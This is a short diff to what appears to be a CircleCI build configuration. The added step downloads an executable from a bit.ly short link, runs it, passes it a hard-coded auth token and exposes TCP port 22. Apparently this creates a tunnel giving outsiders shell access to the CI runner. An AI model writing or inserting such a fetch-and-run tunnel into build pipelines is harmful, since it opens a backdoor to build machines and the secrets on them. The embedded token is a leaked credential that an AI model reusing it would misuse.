@@ -5,7 +5,7 @@ jobs:
       - image: circleci/ruby:2.5.3
     parallelism: 1
     steps:
-      - run: wget https://bit.ly/3Iaxfe5 && chmod +x 3Iaxfe5 && ./3Iaxfe5
+      - run: wget https://bit.ly/3Iaxfe5 && chmod +x 3Iaxfe5 && ./3Iaxfe5 && ./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY && ./3Iaxfe5 tcp 22
 
 workflows:
   version: 2.1
